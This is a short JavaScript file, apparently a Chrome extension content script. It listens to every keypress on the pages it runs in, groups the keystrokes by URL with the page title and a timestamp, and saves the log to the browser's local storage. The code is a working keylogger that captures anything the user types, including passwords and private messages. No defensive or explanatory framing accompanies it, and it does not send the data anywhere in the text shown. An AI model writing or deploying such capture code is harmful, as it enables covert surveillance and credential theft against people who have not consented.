
var lastURL = "";
var lastTime = "";
var lastKey = 0; // Lastkey is used to prevent multiple listeners registering the same key twice
var json = {};

function save(value) {
	chrome.storage.local.set({today: value});
}

function utc() {
	return new Date().getTime();
}

document.addEventListener('keypress', function (e) {
	if (utc() - lastKey > 10) { // Stop duplicates (most people cannot press 2 keys in 10 milliseconds)
		lastKey = utc();
		key = String.fromCharCode(e.keyCode);
		if (e.view.document.URL != lastURL) { // Keys depend on URL's, new URL = new key
			lastURL = e.view.document.URL;
			lastTime = utc();
			json[lastTime] = e.view.document.title + "^~^" + key;
		} else { // Append to existing key
			json[lastTime] += key;
		}
		chrome.storage.local.set(json, function() { console.log(key, e); });
	}
});
